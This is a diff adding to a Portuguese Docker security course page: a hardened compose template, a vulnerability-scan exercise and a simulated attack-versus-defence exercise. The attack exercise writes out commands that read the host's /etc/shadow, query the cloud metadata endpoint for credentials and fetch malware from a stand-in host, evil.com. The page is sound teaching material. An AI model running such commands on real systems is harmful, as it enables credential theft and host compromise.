+    image: minha-org/api:1.5.2@sha256:abc123...  # Pin com digest
+    user: "1000:1000"                              # Non-root
+    read_only: true                                # FS read-only
+    cap_drop:
+      - ALL                                        # Zero capabilities
+    cap_add:
+      - NET_BIND_SERVICE                           # Apenas se porta < 1024
+    security_opt:
+      - no-new-privileges:true                     # Sem escalação
+      - seccomp:./seccomp-api.json                 # Syscalls filtradas
+    tmpfs:
+      - /tmp:rw,noexec,nosuid,size=64m             # Temp sem exec
+      - /var/run:rw,noexec,nosuid,size=8m
+    secrets:
+      - db_password                                # Secrets via arquivo
+      - api_key
+    environment:
+      NODE_ENV: production
+      DB_PASSWORD_FILE: /run/secrets/db_password
+    networks:
+      - frontend
+      - backend
+    healthcheck:
+      test: ["CMD", "wget", "--spider", "-q", "http://localhost:3000/health"]
+      interval: 30s
+      timeout: 5s
+      retries: 3
+    deploy:
+      resources:
+        limits:
+          memory: 512M                             # Limite de RAM
+          cpus: "1.0"                              # Limite de CPU
+    restart: unless-stopped
+    logging:
+      driver: json-file
+      options:
+        max-size: "10m"                            # Limite de log
+        max-file: "3"
+
+  db:
+    image: postgres:16-alpine@sha256:def456...
+    user: "999:999"                                # User postgres
+    read_only: true
+    cap_drop:
+      - ALL
+    security_opt:
+      - no-new-privileges:true
+    tmpfs:
+      - /tmp:rw,noexec,nosuid,size=32m
+      - /var/run/postgresql:rw,noexec,nosuid
+    secrets:
+      - db_password
+    environment:
+      POSTGRES_PASSWORD_FILE: /run/secrets/db_password
+    volumes:
+      - db-data:/var/lib/postgresql/data           # Dados persistentes
+    networks:
+      - backend                                    # Sem internet!
+    deploy:
+      resources:
+        limits:
+          memory: 1G
+          cpus: "2.0"
+    restart: unless-stopped
+
+networks:
+  frontend:
+    driver: bridge
+  backend:
+    driver: bridge
+    internal: true                                 # Sem acesso internet
+
+volumes:
+  db-data:
+    driver: local
+
+secrets:
+  db_password:
+    file: ./secrets/db_password.txt
+  api_key:
+    file: ./secrets/api_key.txt</code></pre>
+            </div>
+          </div>
+          <div class="info-box highlight">
+            <strong>🔑 Use este template</strong> como base para todos os seus projetos em produção. Remova apenas os controles que comprovadamente não são compatíveis com sua aplicação, documentando o motivo.
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- ============================================================ -->
+    <!-- SEÇÃO 9: EXERCÍCIOS -->
+    <!-- ============================================================ -->
+    <section class="module-section">
+      <div class="container">
+        <div class="module-header">
+          <span class="module-badge">Exercícios</span>
+          <h2>Exercícios Práticos</h2>
+          <p>Aplique os conceitos de segurança em cenários realistas. Cada exercício aumenta em complexidade e simula situações reais de hardening em produção.</p>
+        </div>
+
+        <div class="topic-block">
+          <h3>Exercício 1: Scan de Vulnerabilidades e Remediação</h3>
+          <p>Objetivo: Escanear uma imagem, identificar CVEs e corrigir trocando a imagem base.</p>
+          <div class="command-grid">
+            <div class="command-card wide">
+              <div class="command-header"><code>Exercício 1 — Scan e Remediação</code><span class="cmd-tag">Prática</span></div>
+              <pre><code># ════════════════════════════════════════════════════════════════
+# EXERCÍCIO 1: SCAN DE VULNERABILIDADES
+# ════════════════════════════════════════════════════════════════
+
+# PARTE 1: Criar uma imagem VULNERÁVEL (propositalmente):
+# Crie este Dockerfile:
+FROM node:16          # Versão OLD com CVEs conhecidas
+WORKDIR /app
+COPY package*.json ./
+RUN npm install       # Sem --only=production
+COPY . .
+USER root             # ❌ Rodando como root!
+EXPOSE 3000
+CMD ["node", "index.js"]
+
+# Criar app simples (index.js):
+cat > index.js << 'EOF'
+const http = require('http');
+const server = http.createServer((req, res) => {
+  res.writeHead(200);
+  res.end('Hello World\n');
+});
+server.listen(3000);
+EOF
+
+cat > package.json << 'EOF'
+{"name":"vuln-app","version":"1.0.0","dependencies":{"express":"4.17.1","lodash":"4.17.20"}}
+EOF
+
+# PARTE 2: Build e Scan
+docker build -t vuln-app:v1 .
+trivy image vuln-app:v1
+# Observe: dezenas de CVEs HIGH e CRITICAL!
+
+# PARTE 3: Corrigir — Criar versão segura:
+# Novo Dockerfile.secure:
+FROM node:20-alpine AS builder
+WORKDIR /app
+COPY package*.json ./
+RUN npm ci --only=production
+
+FROM gcr.io/distroless/nodejs20-debian12
+WORKDIR /app
+COPY --from=builder /app/node_modules ./node_modules
+COPY index.js .
+USER nonroot:nonroot
+EXPOSE 3000
+CMD ["index.js"]
+
+# PARTE 4: Build e Re-scan
+docker build -f Dockerfile.secure -t vuln-app:v2 .
+trivy image vuln-app:v2
+# Observe: CVEs drasticamente reduzidas!
+
+# PARTE 5: Comparar
+trivy image --severity CRITICAL vuln-app:v1 | wc -l
+trivy image --severity CRITICAL vuln-app:v2 | wc -l
+# Quantas CVEs CRITICAL foram eliminadas?
+
+# VALIDAÇÃO:
+# ✅ v1 tem 10+ CVEs CRITICAL
+# ✅ v2 tem 0-2 CVEs CRITICAL
+# ✅ v2 usa distroless (sem shell)
+# ✅ v2 roda como nonroot
+# ✅ v2 é significativamente menor (docker images)</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="topic-block">
+          <h3>Exercício 2: Container Hardened Completo</h3>
+          <p>Objetivo: Aplicar TODAS as técnicas de hardening em um container de produção.</p>
+          <div class="command-grid">
+            <div class="command-card wide">
+              <div class="command-header"><code>Exercício 2 — Container Hardened</code><span class="cmd-tag">Prática</span></div>
+              <pre><code># ════════════════════════════════════════════════════════════════
+# EXERCÍCIO 2: CONTAINER TOTALMENTE HARDENED
+# ════════════════════════════════════════════════════════════════
+
+# CENÁRIO: API Node.js que precisa ir para produção
+# Aplicar TODAS as práticas de segurança aprendidas.
+
+# REQUISITOS:
+# 1. Multi-stage build (builder + runtime)
+# 2. Imagem base: Alpine ou Distroless
+# 3. User non-root (UID 1000)
+# 4. NENHUMA capability (cap_drop ALL)
+# 5. Read-only filesystem
+# 6. no-new-privileges
+# 7. Healthcheck configurado
+# 8. Resource limits (memory + CPU)
+# 9. Secrets via arquivo (não env var)
+# 10. Logging com limite de tamanho
+# 11. Rede interna para DB
+
+# PASSO 1: Criar Dockerfile hardened
+# (Combine multi-stage + non-root + alpine)
+
+# PASSO 2: Criar docker-compose.yml com:
+services:
+  api:
+    build: .
+    user: "1000:1000"
+    read_only: true
+    cap_drop: [ALL]
+    security_opt:
+      - no-new-privileges:true
+    tmpfs:
+      - /tmp:rw,noexec,nosuid,size=32m
+    secrets: [db_password]
+    environment:
+      DB_PASSWORD_FILE: /run/secrets/db_password
+    networks: [frontend, backend]
+    healthcheck:
+      test: ["CMD", "wget", "--spider", "-q", "http://localhost:3000/health"]
+      interval: 30s
+      timeout: 5s
+      retries: 3
+    deploy:
+      resources:
+        limits:
+          memory: 256M
+          cpus: "0.5"
+    logging:
+      driver: json-file
+      options: { max-size: "5m", max-file: "3" }
+
+  db:
+    image: postgres:16-alpine
+    read_only: true
+    cap_drop: [ALL]
+    security_opt:
+      - no-new-privileges:true
+    tmpfs:
+      - /tmp:rw,noexec,nosuid
+      - /var/run/postgresql:rw,noexec,nosuid
+    secrets: [db_password]
+    environment:
+      POSTGRES_PASSWORD_FILE: /run/secrets/db_password
+    volumes: [db-data:/var/lib/postgresql/data]
+    networks: [backend]
+
+networks:
+  frontend:
+    driver: bridge
+  backend:
+    driver: bridge
+    internal: true
+
+volumes:
+  db-data:
+
+secrets:
+  db_password:
+    file: ./secrets/db_password.txt
+
+# PASSO 3: Criar arquivo de secret
+mkdir -p secrets
+echo -n "SuperSecureP@ss2024" > secrets/db_password.txt
+
+# PASSO 4: Subir e testar
+docker compose up -d
+docker compose ps  # Todos healthy?
+
+# PASSO 5: Verificar hardening
+docker exec api-container whoami          # NÃO é root?
+docker exec api-container touch /test     # Read-only?
+docker inspect api-container | grep -i cap  # Caps removidas?
+
+# VALIDAÇÃO:
+# ✅ whoami retorna non-root
+# ✅ touch /test falha (read-only)
+# ✅ CapAdd: [] e CapDrop: [ALL]
+# ✅ API responde em /health
+# ✅ DB acessível pela API via rede backend
+# ✅ DB NÃO tem acesso à internet</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="topic-block">
+          <h3>Exercício 3: Ataque Simulado e Defesa</h3>
+          <p>Objetivo: Simular um ataque e verificar como as defesas aplicadas impedem a exploração.</p>
+          <div class="command-grid">
+            <div class="command-card wide">
+              <div class="command-header"><code>Exercício 3 — Ataque e Defesa</code><span class="cmd-tag">Red Team</span></div>
+              <pre><code># ════════════════════════════════════════════════════════════════
+# EXERCÍCIO 3: SIMULAÇÃO DE ATAQUE E DEFESA
+# ════════════════════════════════════════════════════════════════
+
+# CENÁRIO: Você é o atacante. Tente explorar um container
+# "inseguro" e depois tente o mesmo no container "hardened".
+
+# ── PARTE A: CONTAINER INSEGURO ──────────────────────────────
+
+# Subir container SEM proteções:
+docker run -d --name inseguro \
+  --privileged \
+  -v /:/host \
+  -p 8080:80 \
+  nginx:latest
+
+# ATAQUE 1: Verificar se é root
+docker exec inseguro whoami
+# root ← Sucesso do atacante!
+
+# ATAQUE 2: Instalar ferramentas
+docker exec inseguro apt-get update
+docker exec inseguro apt-get install -y curl nmap
+# Instalou! ← Atacante pode fazer reconhecimento
+
+# ATAQUE 3: Acessar filesystem do host
+docker exec inseguro ls /host/etc/shadow
+# Consegue ler! ← Hashes de senhas do host!
+
+# ATAQUE 4: Acessar rede
+docker exec inseguro curl http://169.254.169.254/
+# Metadata de cloud! ← Credenciais AWS/GCP!
+
+# Parar e remover:
+docker rm -f inseguro
+
+# ── PARTE B: CONTAINER HARDENED ──────────────────────────────
+
+# Subir container COM proteções:
+docker run -d --name hardened \
+  --user 1000:1000 \
+  --read-only \
+  --cap-drop=ALL \
+  --security-opt=no-new-privileges:true \
+  --tmpfs /tmp:rw,noexec,nosuid,size=16m \
+  --network=none \
+  -p 127.0.0.1:8080:8080 \
+  nginx:alpine
+
+# ATAQUE 1: Verificar se é root
+docker exec hardened whoami
+# nginx ou nobody ← Atacante não é root!
+
+# ATAQUE 2: Tentar instalar ferramentas
+docker exec hardened apk add curl
+# ERROR: Permission denied ← BLOQUEADO!
+
+# ATAQUE 3: Tentar escrever no filesystem
+docker exec hardened touch /backdoor.sh
+# Read-only file system ← BLOQUEADO!
+
+# ATAQUE 4: Tentar acessar rede
+docker exec hardened wget http://evil.com/malware
+# Network unreachable ← BLOQUEADO! (--network=none)
+
+# ATAQUE 5: Tentar escalação de privilégio
+docker exec hardened su root
+# Permission denied ← no-new-privileges!
+
+# RESULTADO:
+# Container inseguro: 4/4 ataques bem-sucedidos ❌
+# Container hardened: 0/4 ataques bem-sucedidos ✅
+
+# LIÇÃO: Cada camada de defesa bloqueia um vetor de ataque.
+# Combinadas, tornam a exploração extremamente difícil.
+
+# VALIDAÇÃO:
+# ✅ Container hardened bloqueia TODOS os ataques
+# ✅ Não é possível instalar ferramentas
+# ✅ Não é possível escrever no filesystem
+# ✅ Não é possível acessar rede externa
+# ✅ Não é possível escalar privilégios</code></pre>
+            </div>
+          </div>
+          <div class="info-box highlight">
+            <strong>🎯 Objetivo final:</strong> Ao completar os 3 exercícios, você terá experiência prática em: identificar e remediar vulnerabilidades, construir containers hardened de produção, e validar que as defesas funcionam contra ataques reais. Isso é o que separa um operador Docker básico de um profissional de segurança.
+          </div>
+        </div>
+
+        <div class="topic-block">
+          <h3>O que vem no próximo módulo</h3>
+          <div class="info-box">
+            <strong>Módulo 07: Docker em Produção</strong> — Você vai aprender como operar Docker em ambientes de produção: logging centralizado, monitoramento com Prometheus e Grafana, CI/CD pipelines, Docker Swarm, preparação para Kubernetes, performance tuning e disaster recovery.
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- CTA -->
     <section class="learning-section">
-      <div class="container" style="display:flex;justify-content:space-between;padding:40px 0">
-        <a href="modulo-05.html" class="button secondary">← Módulo Anterior</a>
-        <a href="modulo-07.html" class="button primary">Próximo Módulo →</a>
+      <div class="container learning-box">
+        <div>
+          <span class="eyebrow">🐳 Próximo passo</span>
+          <h2>Pronto para Docker em Produção?</h2>
+          <p>No Módulo 07 você vai aprender como operar Docker em produção: logging centralizado, monitoramento, CI/CD, Swarm, preparação para Kubernetes e disaster recovery.</p>
+        </div>
+        <a href="modulo-07.html" class="button primary">Ir para Módulo 07 →</a>
       </div>
     </section>
   </main>
